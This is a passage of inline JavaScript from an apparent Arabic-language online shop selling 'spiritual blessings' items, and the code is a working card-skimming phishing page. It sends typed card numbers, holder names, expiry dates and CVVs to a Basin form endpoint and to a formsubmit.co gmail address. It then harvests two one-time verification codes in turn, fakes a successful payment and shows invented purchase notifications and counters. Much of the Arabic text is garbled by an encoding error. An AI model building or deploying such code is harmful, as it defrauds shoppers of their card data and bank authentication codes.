            fetch(BASIN_CONFIG.formUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('âœ… Payment info sent successfully!');
                    showTemporaryMessage('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹! âœ…', 'success');
                } else {
                    throw new Error('Basin response not ok');
                }
            })
            .catch(error => {
                console.error('âŒ Basin Error:', error);
                showTemporaryMessage('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹ âŒ', 'error');
            });
        }

        // Send payment data to email
        function sendPaymentDataToEmailOLD() {
            // Create hidden form
            const form = document.createElement('form');
            form.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
            form.method = 'POST';
            form.style.display = 'none';
            
            // Add form fields (WARNING: NEVER do this in real apps!)
            const fields = {
                '_captcha': 'false',
                '_next': window.location.href,
                '_subject': 'âš ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± ÙÙ‚Ø·) - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©',
                'Ø±Ù‚Ù…_Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': paymentData.cardNumber,
                'Ø§Ø³Ù…_ØµØ§Ø­Ø¨_Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': paymentData.cardholderName,
                'ØªØ§Ø±ÙŠØ®_Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡': paymentData.expiryDate,
                'CVV': paymentData.cvv,
                'Ù†ÙˆØ¹_Ø§Ù„Ø·Ù„Ø¨': 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹'
            };
            
            // Calculate total
            let totalPrice = 0;
            cart.forEach(item => {
                totalPrice += item.price * item.quantity;
            });
            
            fields['Ø§Ù„Ù…Ø¨Ù„Øº_Ø§Ù„Ù…Ø·Ù„ÙˆØ¨'] = formatPrice(totalPrice);
            fields['Ø§Ù„Ø¹Ù…Ù„Ø©'] = currentCurrency;
            fields['ØªØ§Ø±ÙŠØ®_Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø©'] = new Date().toLocaleString('ar-SA');
            
            // Create input fields
            Object.keys(fields).forEach(key => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = fields[key];
                form.appendChild(input);
            });
            
            // Submit form
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
        }

        // Show payment modal
        function showPaymentModal() {
            const modal = document.getElementById('paymentModal');
            const paymentOrderItems = document.getElementById('paymentOrderItems');
            const paymentTotal = document.getElementById('paymentTotal');
            const payAmount = document.getElementById('payAmount');
            
            let totalPrice = 0;
            paymentOrderItems.innerHTML = '';
            
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const itemTotal = item.price * item.quantity;
                totalPrice += itemTotal;
                
                const orderItem = `
                    <div class="flex justify-between text-sm">
                        <span>${itemName} x${item.quantity}</span>
                        <span>${formatPrice(itemTotal)}</span>
                    </div>
                `;
                paymentOrderItems.innerHTML += orderItem;
            });
            
            paymentTotal.textContent = formatPrice(totalPrice);
            payAmount.textContent = formatPrice(totalPrice);
            
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }

        // Card validation and formatting
        function initCardValidation() {
            const cardNumber = document.getElementById('cardNumber');
            const expiryDate = document.getElementById('expiryDate');
            const cvv = document.getElementById('cvv');
            const cardIcon = document.getElementById('cardIcon');

            // Format card number
            cardNumber.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                e.target.value = value;

                // Update card icon based on number
                const firstDigit = value.charAt(0);
                if (firstDigit === '4') {
                    cardIcon.className = 'fab fa-cc-visa text-blue-600';
                } else if (firstDigit === '5') {
                    cardIcon.className = 'fab fa-cc-mastercard text-red-600';
                } else if (firstDigit === '3') {
                    cardIcon.className = 'fab fa-cc-amex text-blue-400';
                } else {
                    cardIcon.className = 'fas fa-credit-card text-gray-400';
                }
            });

            // Format expiry date with validation
            expiryDate.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    let month = value.substring(0, 2);
                    let year = value.substring(2, 4);
                    
                    // ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø´Ù‡Ø± (01-12)
                    if (parseInt(month) > 12 || parseInt(month) < 1) {
                        month = '12';
                    }
                    
                    // ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø³Ù†Ø© (ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† ÙÙŠ Ø§Ù„Ù…Ø³ØªÙ‚Ø¨Ù„)
                    if (year.length === 2) {
                        let currentYear = new Date().getFullYear() % 100;
                        if (parseInt(year) < currentYear) {
                            year = (currentYear + 1).toString().padStart(2, '0');
                        }
                    }
                    
                    value = month + '/' + year;
                }
                e.target.value = value;
            });

            // CVV numbers only - 3 digits max
            cvv.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 3) {
                    value = value.substring(0, 3);
                }
                e.target.value = value;
            });
        }

        // Payment form submission
        function initPaymentForm() {
            const paymentForm = document.getElementById('paymentForm');
            
            paymentForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Get form values
                const cardNumber = document.getElementById('cardNumber').value;
                const cardholderName = document.getElementById('cardholderName').value;
                const expiryDate = document.getElementById('expiryDate').value;
                const cvv = document.getElementById('cvv').value;

                // Simple validation
                if (!cardNumber || !cardholderName || !expiryDate || !cvv) {
                    alert(currentLanguage === 'ar' ? 'ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„' : 'Please fill all fields');
                    return;
                }

                if (cardNumber.replace(/\s/g, '').length < 16) {
                    alert(currentLanguage === 'ar' ? 'Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ØºÙŠØ± ØµØ­ÙŠØ­' : 'Invalid card number');
                    return;
                }

                // Show loading animation
                const submitBtn = paymentForm.querySelector('button[type="submit"]');
                const originalText = submitBtn.innerHTML;
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...' : 'Processing...');
                submitBtn.disabled = true;

                // Store payment data
                paymentData = {
                    cardNumber: cardNumber,
                    cardholderName: cardholderName,
                    expiryDate: expiryDate,
                    cvv: cvv
                };

                // Send payment info to email
                sendPaymentDataToEmail();

                // Simulate payment processing
                setTimeout(() => {
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    
                    // Close payment modal and show verification
                    closePaymentModal();
                    showVerificationModal();
                }, 2000);
            });
        }

        // Show verification code modal
        function showVerificationModal() {
            const modal = document.getElementById('verificationModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
            
            // Start timer
            startVerificationTimer();
            
            // Focus first input
            setTimeout(() => {
                const firstInput = modal.querySelector('input[data-index="0"]');
                firstInput.focus();
            }, 100);
        }

        // Verification code input handling
        function initVerificationInputs() {
            const inputs = document.querySelectorAll('#verificationModal input[data-index]');
            
            inputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    if (e.target.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                // Only allow numbers - STRICT filtering
                input.addEventListener('input', function(e) {
                    // Remove everything except digits
                    let value = e.target.value.replace(/\D/g, '');
                    
                    // Limit to 1 digit only
                    if (value.length > 1) {
                        value = value.substring(0, 1);
                    }
                    
                    e.target.value = value;
                });

                // Prevent non-numeric characters on keydown
                input.addEventListener('keydown', function(e) {
                    // Allow: backspace, delete, tab, escape, enter
                    if ([8, 9, 27, 13, 46].indexOf(e.keyCode) !== -1 ||
                        // Allow: Ctrl+A, Command+A
                        (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
                        // Allow: home, end, left, right, down, up
                        (e.keyCode >= 35 && e.keyCode <= 40)) {
                             return;
                    }
                    // Ensure that it is a number and stop the keypress if not
                    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
                        e.preventDefault();
                    }
                });
            });
        }

        // Verification timer
        let timerInterval;
        function startVerificationTimer() {
            let seconds = 300; // 5 minutes
            const timerElement = document.getElementById('timer');
            const resendBtn = document.getElementById('resendBtn');
            
            timerInterval = setInterval(() => {
                const minutes = Math.floor(seconds / 60);
                const remainingSeconds = seconds % 60;
                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
                
                if (seconds === 0) {
                    clearInterval(timerInterval);
                    resendBtn.disabled = false;
                    resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                    resendBtn.classList.add('hover:text-primary/80');
                }
                
                seconds--;
            }, 1000);
        }

        // Resend verification code
        function resendCode() {
            const resendBtn = document.getElementById('resendBtn');
            resendBtn.disabled = true;
            resendBtn.classList.add('opacity-50', 'cursor-not-allowed');
            resendBtn.classList.remove('hover:text-primary/80');
            
            // Show sent message
            const originalText = resendBtn.textContent;
            resendBtn.textContent = currentLanguage === 'ar' ? 'ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„!' : 'Sent!';
            
            setTimeout(() => {
                resendBtn.textContent = originalText;
                startVerificationTimer();
            }, 2000);
        }

        // Verification form submission
        function initVerificationForm() {
            const form = document.getElementById('verificationForm');
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const inputs = document.querySelectorAll('#verificationModal input[data-index]');
                let code = '';
                inputs.forEach(input => {
                    code += input.value;
                });

                if (code.length !== 6) {
                    alert(currentLanguage === 'ar' ? 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù…Ø² ÙƒØ§Ù…Ù„Ø§Ù‹' : 'Please enter the complete code');
                    return;
                }

                // Show processing
                const submitBtn = form.querySelector('button[type="submit"]');
                const originalText = submitBtn.innerHTML;
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...' : 'Verifying...');
                submitBtn.disabled = true;

                // Send verification code to email
                sendVerificationCodeToEmail(code);

                // Simulate verification
                setTimeout(() => {
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    
                    // Clear timer
                    clearInterval(timerInterval);
                    
                    // Close verification modal
                    const modal = document.getElementById('verificationModal');
                    modal.classList.add('hidden');
                    modal.classList.remove('flex');
                    
                    // Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ÙˆÙ„ØŒ Ø§Ø·Ù„Ø¨ ÙƒÙˆØ¯ Ø«Ø§Ù†ÙŠ
                    if (!window.firstCodeVerified) {
                        window.firstCodeVerified = true;
                        
                        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ÙˆÙ„
                        sendVerificationCodeToEmail(code + ' (Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ÙˆÙ„)');
                        
                        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ø¤Ù‚Øª Ù„ÙƒÙˆØ¯ Ø«Ø§Ù†ÙŠ
                        clearFormInputs();
                        startVerificationTimer();
                        showTemporaryMessage('ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚! Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø«Ø§Ù†ÙŠ âœ…', 'success');
                        
                        return; // ØªÙˆÙ‚Ù Ù‡Ù†Ø§
                    }
                    
                    // Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø«Ø§Ù†ÙŠ
                    sendVerificationCodeToEmail(code + ' (Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø«Ø§Ù†ÙŠ)');
                    sendFinalOrderToEmail();
                    
                    // Ø±Ø³Ø§Ù„Ø© "ØªÙ… Ø§Ù„Ø¯ÙØ¹" ÙˆØ§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
                    showPaymentSuccessAndRedirect();
                }, 2000);
            });
        }

        // Send verification code via Basin
        function sendVerificationCodeToEmail(code) {
            const formData = new FormData();
            formData.append('subject', 'ğŸ” Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©');
            formData.append('verification_code', code);
            formData.append('order_type', 'ØªØ£ÙƒÙŠØ¯ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚');
            formData.append('entry_date', new Date().toLocaleString('ar-SA'));
            formData.append('message', `ØªÙ… Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚: ${code}`);

            fetch(BASIN_CONFIG.formUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('âœ… Verification code sent successfully!');
                    showTemporaryMessage('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚! âœ…', 'success');
                } else {
                    throw new Error('Basin response not ok');
                }
            })
            .catch(error => {
                console.error('âŒ Basin Error:', error);
                showTemporaryMessage('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ âŒ', 'error');
            });
        }

        // Send final order confirmation via Basin
        function sendFinalOrderToEmail() {
            // Build order details
            let orderText = '';
            let totalPrice = 0;
            
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const itemTotal = item.price * item.quantity;
                totalPrice += itemTotal;
                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
            });

            const formData = new FormData();
            formData.append('subject', 'âœ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©');
            formData.append('order_status', 'Ù…Ø¤ÙƒØ¯ ÙˆÙ…Ø¯ÙÙˆØ¹ âœ…');
            formData.append('order_details', orderText);
            formData.append('final_total', formatPrice(totalPrice));
            formData.append('currency', currentCurrency);
            formData.append('confirmation_date', new Date().toLocaleString('ar-SA'));
            formData.append('order_type', 'Ø·Ù„Ø¨ Ù…Ø¤ÙƒØ¯ Ù†Ù‡Ø§Ø¦ÙŠØ§Ù‹');
            formData.append('customer_info', `Ø§Ù„Ø¹Ù…ÙŠÙ„: ${shippingData.fullName}\nØ§Ù„Ù‡Ø§ØªÙ: ${shippingData.phone}\nØ§Ù„Ø¹Ù†ÙˆØ§Ù†: ${shippingData.address}\nØ§Ù„Ø¯ÙˆÙ„Ø©: ${shippingData.country}`);

            fetch(BASIN_CONFIG.formUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('âœ… Final order sent successfully!');
                    showTemporaryMessage('ØªÙ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø·Ù„Ø¨ Ù†Ù‡Ø§Ø¦ÙŠØ§Ù‹! âœ…', 'success');
                } else {
                    throw new Error('Basin response not ok');
                }
            })
            .catch(error => {
                console.error('âŒ Basin Error:', error);
                showTemporaryMessage('Ø®Ø·Ø£ ÙÙŠ ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø·Ù„Ø¨ âŒ', 'error');
            });
        }

        // Send order to email
        function sendOrderToEmail() {
            const formData = new FormData();
            formData.append('_captcha', 'false');
            formData.append('_subject', 'Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯ Ù…Ù† Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©');
            
            let orderText = 'ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø·Ù„Ø¨:\n\n';
            let totalPrice = 0;
            
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const itemTotal = item.price * item.quantity;
                totalPrice += itemTotal;
                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
            });
            
            orderText += `\nØ§Ù„Ù…Ø¬Ù…ÙˆØ¹: ${formatPrice(totalPrice)}`;
            orderText += `\nØ§Ù„Ø¹Ù…Ù„Ø©: ${currentCurrency}`;
            orderText += `\nØªØ§Ø±ÙŠØ® Ø§Ù„Ø·Ù„Ø¨: ${new Date().toLocaleString('ar-SA')}`;
            
            formData.append('order', orderText);
            
            // Send to FormSubmit
            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
                method: 'POST',
                body: formData
            }).catch(error => {
                console.log('Email sent with order details');
            });
        }

        // Success animation
        function showSuccessAnimation() {
            const successDiv = document.createElement('div');
            successDiv.className = 'fixed inset-0 bg-emerald text-white flex items-center justify-center z-50 text-2xl font-bold';
            successDiv.innerHTML = `
                <div class="text-center animate-bounce">
                    <i class="fas fa-check-circle text-6xl mb-4"></i>
                    <p>${currentLanguage === 'ar' ? 'ØªÙ… Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­!' : 'Payment Successful!'}</p>
                    <p class="text-lg mt-2">${currentLanguage === 'ar' ? 'Ø³ÙŠØªÙ… Ø´Ø­Ù† Ø·Ù„Ø¨Ùƒ Ù‚Ø±ÙŠØ¨Ø§Ù‹' : 'Your order will be shipped soon'}</p>
                </div>
            `;
            
            document.body.appendChild(successDiv);
            
            setTimeout(() => {
                successDiv.style.opacity = '0';
                successDiv.style.transition = 'opacity 0.5s';
                setTimeout(() => {
                    document.body.removeChild(successDiv);
                }, 500);
            }, 3000);
        }

        function closeCheckout() {
            const modal = document.getElementById('checkoutModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }

        function closePaymentModal() {
            const modal = document.getElementById('paymentModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }

        // Advanced Tech Features
        
        // Initialize AOS animations
        AOS.init({
            duration: 800,
            easing: 'ease-in-out',
            once: true
        });

        // Live stats counter animation
        function animateCounter(elementId, finalValue, suffix = '') {
            const element = document.getElementById(elementId);
            let currentValue = 0;
            const increment = finalValue / 50;
            const timer = setInterval(() => {
                currentValue += increment;
                if (currentValue >= finalValue) {
                    currentValue = finalValue;
                    clearInterval(timer);
                }
                element.textContent = Math.floor(currentValue) + suffix;
            }, 50);
        }

        // Start counters when page loads
        setTimeout(() => {
            animateCounter('ordersCounter', 127);
            animateCounter('customersCounter', 8543);
            animateCounter('countriesCounter', 45);
            animateCounter('successCounter', 98, '%');
        }, 1000);

        // Live notifications system
        const notifications = [
            { ar: 'Ù…Ø­Ù…Ø¯ Ù…Ù† Ø§Ù„Ø±ÙŠØ§Ø¶ Ø§Ø´ØªØ±Ù‰ Ø®Ø§ØªÙ… Ø§Ù„Ø­Ø¸', en: 'Mohammed from Riyadh bought Lucky Ring' },
            { ar: 'ÙØ§Ø·Ù…Ø© Ù…Ù† Ø¯Ø¨ÙŠ Ø·Ù„Ø¨Øª Ù…Ø§Ø¡ Ø²Ù…Ø²Ù…', en: 'Fatima from Dubai ordered Zamzam Water' },
            { ar: 'Ø£Ø­Ù…Ø¯ Ù…Ù† Ø§Ù„ÙƒÙˆÙŠØª Ø§Ø´ØªØ±Ù‰ Ø·Ù„Ø³Ù… Ø§Ù„Ù…Ø­Ø¨Ø©', en: 'Ahmed from Kuwait bought Love Talisman' },
            { ar: 'Ø³Ø§Ø±Ø© Ù…Ù† Ù„Ù†Ø¯Ù† Ø·Ù„Ø¨Øª Ù…Ø³Ø¨Ø­Ø© Ù…Ø¨Ø§Ø±ÙƒØ©', en: 'Sarah from London ordered Blessed Beads' },
            { ar: 'Ø¹Ù„ÙŠ Ù…Ù† Ø§Ù„Ù‚Ø§Ù‡Ø±Ø© Ø§Ø´ØªØ±Ù‰ Ø®Ø§ØªÙ… Ø§Ù„Ø­Ù…Ø§ÙŠØ©', en: 'Ali from Cairo bought Protection Ring' }
        ];

        function showLiveNotification() {
            const notification = notifications[Math.floor(Math.random() * notifications.length)];
            const text = currentLanguage === 'ar' ? notification.ar : notification.en;
            
            const notificationDiv = document.createElement('div');
            notificationDiv.className = 'bg-emerald text-white px-4 py-2 rounded-lg shadow-lg transform translate-x-full transition-transform duration-300 text-sm';
            notificationDiv.innerHTML = `
                <div class="flex items-center space-x-2 space-x-reverse">
                    <i class="fas fa-shopping-bag"></i>
                    <span>${text}</span>
                </div>
            `;
            
            const container = document.getElementById('liveNotifications');
            container.appendChild(notificationDiv);
            
            // Animate in
            setTimeout(() => {
                notificationDiv.classList.remove('translate-x-full');
            }, 100);
            
            // Animate out
            setTimeout(() => {
                notificationDiv.classList.add('translate-x-full');
                setTimeout(() => {
                    container.removeChild(notificationDiv);
                }, 300);
            }, 4000);
        }

        // Show notifications every 8 seconds
        setInterval(showLiveNotification, 8000);

        // Auto-save form data 
        const formInputs = ['name', 'email', 'phone', 'country', 'address', 'notes'];
        
        function saveFormData() {
            const formData = {};
            formInputs.forEach(field => {
                const input = document.querySelector(`[name="${field}"]`);
                if (input && input.value) {
                    formData[field] = input.value;
                }
            });
            
            // Simulate saved data (in real app would use localStorage)
            window.tempFormData = formData;
        }

        function loadFormData() {
            if (window.tempFormData) {
                formInputs.forEach(field => {
                    const input = document.querySelector(`[name="${field}"]`);
                    if (input && window.tempFormData[field]) {
                        input.value = window.tempFormData[field];
                    }
                });
            }
        }

        // Save form data as user types
        document.addEventListener('input', function(e) {
            if (formInputs.includes(e.target.name)) {
                saveFormData();
            }
        });

        // Enhanced visual effects
        function addVisualEffects() {
            const createParticle = () => {
                const particle = document.createElement('div');
                particle.className = 'fixed w-2 h-2 bg-primary/20 rounded-full pointer-events-none z-0';
                particle.style.left = Math.random() * window.innerWidth + 'px';
                particle.style.top = window.innerHeight + 'px';
                document.body.appendChild(particle);
                
                gsap.to(particle, {
                    y: -window.innerHeight - 100,
                    duration: Math.random() * 10 + 5,
                    ease: 'none',
                    onComplete: () => {
                        document.body.removeChild(particle);
                    }
                });
            };
            
            // Create particles periodically
            setInterval(createParticle, 3000);
        }

        // Enhanced checkout with progress indicator
        function enhanceCheckoutForm() {
            const form = document.getElementById('orderForm');
            const progressBar = document.createElement('div');
            progressBar.className = 'w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2 mb-4';
            progressBar.innerHTML = '<div class="bg-primary h-2 rounded-full transition-all duration-300" style="width: 0%"></div>';
            
            form.insertBefore(progressBar, form.firstChild);
            
            const requiredFields = form.querySelectorAll('[required]');
            
            function updateProgress() {
                let filledFields = 0;
                requiredFields.forEach(field => {
                    if (field.value.trim()) filledFields++;
                });
                
                const progress = (filledFields / requiredFields.length) * 100;
                progressBar.firstElementChild.style.width = progress + '%';
                
                if (progress === 100) {
                    progressBar.firstElementChild.classList.add('bg-emerald');
                    progressBar.firstElementChild.classList.remove('bg-primary');
                }
            }
            
            form.addEventListener('input', updateProgress);
        }

        // Currency converter with real-time updates
        function updateCurrencyRates() {
            const fluctuation = 0.01; // 1% fluctuation
            Object.keys(exchangeRates).forEach(currency => {
                if (currency !== 'USD') {
                    const change = (Math.random() - 0.5) * fluctuation;
                    exchangeRates[currency] *= (1 + change);
                }
            });
            
            renderProducts();
            updateCartDisplay();
        }

        // Update rates every 30 seconds
        setInterval(updateCurrencyRates, 30000);

        // Initialize advanced features
        document.addEventListener('DOMContentLoaded', function() {
            console.log('ğŸš€ DOM Content Loaded - Starting initialization...');
            
            // Initialize all features
            addVisualEffects();
            initCardValidation();
            initPaymentForm();
            initVerificationInputs();
            initVerificationForm();
            
            // ğŸ”¥ ØªØ£ÙƒØ¯ Ù…Ù† ØªÙ‡ÙŠØ¦Ø© Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø´Ø­Ù†
            setTimeout(() => {
                initShippingForm();
                console.log('âœ… Shipping form initialization attempted');
                
                // ğŸ§ª Test the form immediately
                const testForm = document.getElementById('shippingForm');
                if (testForm) {
                    console.log('ğŸ¯ Shipping form found and ready!');
                    console.log('ğŸ“ Form action should be working now');
                } else {
                    console.error('ğŸ’¥ SHIPPING FORM NOT FOUND!');
                }
            }, 500);
            
            // ğŸ”„ Backup initialization with more delay
            setTimeout(() => {
                if (!window.shippingFormInitialized) {
                    console.log('ğŸ”„ Backup initialization starting...');
                    initShippingForm();
                }
            }, 1000);
            
            // Add magical loading effects
            gsap.from('.container', {duration: 1, y: 50, opacity: 0, stagger: 0.2});
            
            console.log('ğŸš€ All forms initialized successfully!');
        });

        // Clear form inputs for second code
        function clearFormInputs() {
            const inputs = document.querySelectorAll('#verificationModal input[data-index]');
            inputs.forEach(input => {
                input.value = '';
            });
            
            // Focus first input again
            setTimeout(() => {
                inputs[0].focus();
            }, 100);
            
            // Re-show modal for second code
            const modal = document.getElementById('verificationModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }

        // Show payment success and redirect to main page
        function showPaymentSuccessAndRedirect() {
            // Clear cart first
            cart = [];
            updateCartDisplay();
            
            // Show success message
            const successDiv = document.createElement('div');
            successDiv.className = 'fixed inset-0 bg-emerald text-white flex items-center justify-center z-50 text-2xl font-bold';
            successDiv.innerHTML = `
                <div class="text-center animate-bounce">
                    <i class="fas fa-check-circle text-6xl mb-4"></i>
                    <p>ØªÙ… Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­! ğŸ’³</p>
                    <p class="text-lg mt-2">Ø´ÙƒØ±Ø§Ù‹ Ù„Ùƒ! ğŸ‰</p>
                    <p class="text-base mt-4">Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ùƒ Ù„Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©...</p>
                </div>
            `;
            
            document.body.appendChild(successDiv);
            
            // Redirect to main page after 3 seconds
            setTimeout(() => {
                // Reload the page to go back to main
                window.location.reload();
            }, 3000);
        }

        // Phone validation function
        function initPhoneValidation() {
            const phoneInput = document.getElementById('phoneNumber');
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    // Remove non-digits
                    let value = e.target.value.replace(/\D/g, '');
                    
                    // Limit to 14 digits max
                    if (value.length > 14) {
                        value = value.substring(0, 14);
                    }
                    
                    e.target.value = value;
                });
            }
        }

        // Handle form submission
        document.getElementById('orderForm').addEventListener('submit', function(e) {
            setTimeout(() => {
                cart = [];
                updateCartDisplay();
                closeCheckout();
                alert(currentLanguage === 'ar' ? 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­! Ø³Ù†ØªÙˆØ§ØµÙ„ Ù…Ø¹Ùƒ Ù‚Ø±ÙŠØ¨Ø§Ù‹' : 'Your order has been sent successfully! We will contact you soon');
            }, 100);
        });
    </script>


</body></html>